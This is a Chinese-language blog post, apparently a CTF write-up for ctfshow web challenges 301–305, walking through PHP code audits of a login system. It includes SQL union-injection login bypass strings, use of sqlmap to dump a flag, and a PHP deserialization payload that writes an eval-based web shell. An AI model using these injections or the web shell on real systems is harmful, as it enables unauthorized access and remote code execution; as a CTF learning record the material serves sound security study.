@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web301 首先用seay扫了下，没有显示漏洞 然后进了&#x2F;index.php，显示1Access denied for user &amp;#x27;root&amp;#x27;@&amp;#x27;localhost&amp;#x27; (using password: YES) 非常奇怪 像是SSL或者SQL登录。抓个包看下，也只是发送了  12345678910GET &#x2F;index.php HTTP&#x2F;1.1Ho">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-web入门笔记-代码审计入门">
+<meta property="og:url" content="http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="web301 首先用seay扫了下，没有显示漏洞 然后进了&#x2F;index.php，显示1Access denied for user &amp;#x27;root&amp;#x27;@&amp;#x27;localhost&amp;#x27; (using password: YES) 非常奇怪 像是SSL或者SQL登录。抓个包看下，也只是发送了  12345678910GET &#x2F;index.php HTTP&#x2F;1.1Ho">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-04T16:19:37.000Z">
+<meta property="article:modified_time" content="2024-05-04T16:19:47.731Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="web学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow-web入门笔记-代码审计入门</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%EF%BC%88PHP%E5%92%8C%E4%B8%80%E7%82%B9Python%EF%BC%89/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xxe%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&text=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&is_video=false&description=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-代码审计入门&body=Check out this article: http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&name=ctfshow-web入门笔记-代码审计入门&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/&t=ctfshow-web入门笔记-代码审计入门"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web301"><span class="toc-number">1.</span> <span class="toc-text">web301</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web302"><span class="toc-number">2.</span> <span class="toc-text">web302</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web303"><span class="toc-number">3.</span> <span class="toc-text">web303</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web304"><span class="toc-number">4.</span> <span class="toc-text">web304</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web305"><span class="toc-number">5.</span> <span class="toc-text">web305</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web306"><span class="toc-number">6.</span> <span class="toc-text">web306</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%96%B9%E6%B3%95%E9%97%AE%E9%A2%98"><span class="toc-number">6.1.</span> <span class="toc-text">PHP序列化的方法问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web307"><span class="toc-number">7.</span> <span class="toc-text">web307</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web308-SSRF%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81MySQL"><span class="toc-number">8.</span> <span class="toc-text">web308 - SSRF打无密码MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web309-SSRF%E6%89%93FastCGI"><span class="toc-number">9.</span> <span class="toc-text">web309 - SSRF打FastCGI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web310-SSRF%E8%AF%BB%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">10.</span> <span class="toc-text">web310 - SSRF读配置文件</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow-web入门笔记-代码审计入门
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-04T16:19:37.000Z" class="dt-published" itemprop="datePublished">2024-05-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web%E5%AD%A6%E4%B9%A0/" rel="tag">web学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h2><ul>
+<li>首先用seay扫了下，没有显示漏洞</li>
+<li>然后进了&#x2F;index.php，显示<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: YES)</span><br></pre></td></tr></table></figure>
+非常奇怪 像是SSL或者SQL登录。抓个包看下，也只是发送了</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: showshenji</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: PHPSESSID=g6a2d37i0gc5fgbb6qc2581hom</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>查看代码目录，有个<code>login.php</code>。浏览器进去发现是个后台登录页面。代码上是通过调用<code>checklogin.php</code>来处理的。</p>
+<p>查看<code>checklogin.php</code>，里面代码非常乱。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"><span class="variable">$userpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>然后看到了sql查询字符串拼接。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>那就说明<code>$username</code>可以注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = &#x27; union select 1 #</span><br><span class="line">password = 1</span><br></pre></td></tr></table></figure>
+
+<p>这里的password为什么必须要为1？因为在之前的sql查询字符串拼接中，通过union把查询结果设置为1，然后把password设为1，就能让</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcasecmp($userpwd,$row[&#x27;sds_password&#x27;])</span><br></pre></td></tr></table></figure>
+<p>为0，从而让<code>$_SESSION[&#39;login&#39;]=1;</code>，成功登录。</p>
+<h2 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h2><p>直接下载代码。和上一题没有任何不同。</p>
+<p>看提示是只修改了一行，也就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">sds_decode</span>(<span class="variable">$userpwd</span>),<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>sds_decode()</code>是<code>fun.php</code>中的一个函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只需把union注入时的内容过一下函数就能对上了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sds_encode</span>(<span class="string">&#x27;a&#x27;</span>); <span class="comment">//db89a0f46d92918f0b185d8fbfc19c03</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = &#x27; union select &#x27;db89a0f46d92918f0b185d8fbfc19c03&#x27; #</span><br><span class="line">password = a</span><br></pre></td></tr></table></figure>
+
+<h2 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">6</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>加了对username长度的限制。</p>
+<p><code>fun.php</code>加了一句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sds_decode</span>(<span class="string">&quot;admin&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>推测密码为admin？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin</span><br><span class="line">password = admin</span><br></pre></td></tr></table></figure>
+<p>因为<code>sds_user.sql</code>中存在一条记录：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `sds_user` <span class="keyword">VALUES</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;27151b7b1ad51a38ea66b1529cde5ee4&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>登录后，可以进入<code>/dpt.php</code>，里面有个新增的按钮，调用了<code>dptadd.php</code>。查看<code>dptadd.php</code>，发现除<code>$dpt_has_cert</code>外的所有参数全部可控。</p>
+<p>burp抓个包，放到sqlmap跑一下。</p>
+<p>可以注出数据库是<code>sds</code>，表名是<code>sds_fl9g</code>，列名是<code>flag</code>，最后得到flag。</p>
+<h2 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h2><p>增加全局waf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|-/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没什么用，同上题，登录admin后直接用sqlmap注入即可。</p>
+<h2 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h2><p>同上题，登录没啥变化，发现sql记录-&gt;审计算法-&gt;发现可以用admin&#x2F;admin进入。</p>
+<p><code>fun.php</code>新增waf：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\&#x27;|\&quot;|\,|\.|\?|\/|\\\|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ctrl一下查看在哪里利用，发现对所有输入都进行了waf的过滤。</p>
+<p>发现了<code>class.php</code>，里面定义了user类，疑似可以反序列化；然而ctrl了一下发现没有用到这段代码的地方</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后尝试了一下绕过preg_match，包括数组绕过、PCRE绕过等；没绕过去就看了下wp，发现果然是眼瞎了。<code>checklogin.php</code>有个反序列化的函数。可以使用<code>class.php</code>，通过<code>__destruct()</code>的<code>file_put_contents</code>写马。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user_cookie</span>))&#123;</span><br><span class="line">	<span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试写一个user的类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&quot;a.php&quot;</span>,<span class="string">&quot;&lt;?php eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//echo $user-&gt;password;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后直接在<code>/</code>下搜索flag文件。</p>
